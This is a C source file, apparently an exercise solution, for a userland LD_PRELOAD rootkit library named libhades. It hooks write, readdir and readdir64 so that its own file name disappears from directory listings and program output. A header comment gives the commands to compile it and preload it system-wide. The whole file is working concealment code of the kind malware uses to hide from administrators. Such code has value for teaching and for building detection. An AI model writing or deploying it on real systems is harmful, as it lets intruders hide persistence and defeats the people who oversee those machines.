/* Program to demonstrate LD_PRELOAD trick.
 * Compile it using: gcc -ldl solution.c -fPIC -shared -D_GNU_SOURCE -o libhades.so.1
 * export LD_PRELOAD=$(pwd)/libhades.so.1
 * Features:
 * -- Hide from ls
 */

#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

/* ### DEFINES ### */
#define SONAME				"libhades.so.1"
#define MAX_LINE_SIZE		4096

/* Uncomment this if you want to see debug messages */
// #define DEBUG


/* Hooking system and library calls */
/* ### DEFINITIONS ### */
void debug(const char *message) {
	printf("[ DEBUG ] %s\n", message);
	fflush(stdout);
}

ssize_t write(int fd, const void *buf, size_t count) {
	ssize_t (*old_write)(int fd, const void *buf, size_t count);
	ssize_t bytes_written = (ssize_t)count;

#ifdef DEBUG
	debug("write syscall hooked.");
#endif

	old_write = dlsym(RTLD_NEXT, "write");

	/* If a special string that we want to hide is to be written,
	 * don't write it and return the number of bytes passed to the legit
	 * call, as if it actually was written, but in reality, it was not.
	 */
	if (strstr((const char *)buf, SONAME) == NULL) {
		bytes_written = old_write(fd, buf, count);
	}

	return bytes_written;
}

struct dirent *readdir(DIR *dirp) {
	struct dirent *(*old_readdir)(DIR *dirp);
	struct dirent *dir;

#ifdef DEBUG
	debug("readdir library call hooked.");
#endif

	old_readdir = dlsym(RTLD_NEXT, "readdir");

	while ((dir = old_readdir(dirp)) && (strstr(dir->d_name, SONAME) != NULL));
	return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
	struct dirent64 *(*old_readdir64)(DIR *dirp);
	struct dirent64 *dir;

#ifdef DEBUG
	debug("readdir64 library call hooked.");
#endif

	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

	while ((dir = old_readdir64(dirp)) && (strstr(dir->d_name, SONAME) != NULL));
	return dir;
}
